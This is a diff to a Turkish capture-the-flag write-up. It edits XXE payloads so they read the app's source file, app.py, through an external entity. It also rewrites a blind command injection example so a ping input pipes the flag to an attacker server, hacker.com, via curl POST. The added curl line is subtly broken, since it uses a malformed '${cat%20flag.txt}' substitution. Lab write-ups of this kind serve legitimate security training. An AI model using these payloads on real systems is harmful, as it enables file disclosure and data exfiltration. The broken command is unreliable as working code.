@@ -63,13 +63,13 @@ Burada **`load_dtd=True`** ve **`resolve_entities=True`** parametreleri, uygulam
 
 ### Payload Oluşturma ve Saldırı
 
-Hedefimiz, **flag.txt** dosyasını okumak. Aşağıdaki gibi bir XML payload'ı oluşturabiliriz:
+Hedefimiz, kaynak kodunu okumak. Bu sayede logini aşacak bir adım bulabiliriz. Aşağıdaki gibi bir XML payload'ı oluşturabiliriz:
 
 ```xml
 <!DOCTYPE foo [ 
   <!ELEMENT username (#PCDATA)>
   <!ELEMENT password (#PCDATA)>
-  <!ENTITY xxe SYSTEM "file:///path/to/flag.txt">
+  <!ENTITY xxe SYSTEM "file:///path/to/app.py">
 ]>
 <login>
   <username>&xxe;</username>
@@ -80,7 +80,7 @@ Hedefimiz, **flag.txt** dosyasını okumak. Aşağıdaki gibi bir XML payload'ı
 Bu payload şunları yapar:
 
 1. Bir dış varlık tanımlar (**`<!ENTITY>`**).
-2. Sunucunun dosya sistemindeki hassas dosyayı okur (**`file:///path/to/flag.txt`**).
+2. Sunucunun dosya sistemindeki hassas dosyayı okur (**`file:///path/to/app.py`**).
 3. Sonuçta, kullanıcı adı alanına bu dosyanın içeriğini yerleştirir.
 
 ---
@@ -99,7 +99,7 @@ Content-Type: application/xml
 <!DOCTYPE foo [
   <!ELEMENT username (#PCDATA)>
   <!ELEMENT password (#PCDATA)>
-  <!ENTITY xxe SYSTEM "file:///flag.txt">
+  <!ENTITY xxe SYSTEM "file:///path/to/app.py">
 ]>
 <login>
   <username>&xxe;</username>
@@ -175,13 +175,12 @@ Ping çıktısının ardından `flag.txt` dosyasının içeriği görüntülenir
 
 ### Blind Command Injection
 
-`/blind` endpointinde komutların çıktısı doğrudan kullanıcıya gösterilmiyor. Ancak komutun sonuçlarını dosyaya yazdırarak zafiyeti kullanabiliriz:
+`/blind` endpointinde komutların çıktısı doğrudan kullanıcıya gösterilmiyor. Ancak komutun sonuçlarını bizim kontrol ettiğimiz bir servera göndererek zafiyeti kullanabiliriz:
 
 ```bash
-127.0.0.1; echo "FLAG:$(cat /flag.txt)" > /tmp/output.txt
+127.0.0.1; curl -X POST -d "${cat%20flag.txt}" https://hacker.com  
 ```
 
-Daha sonra `/tmp/output.txt` dosyasını başka bir yolla okuyabilirsiniz.
 
 ---
 
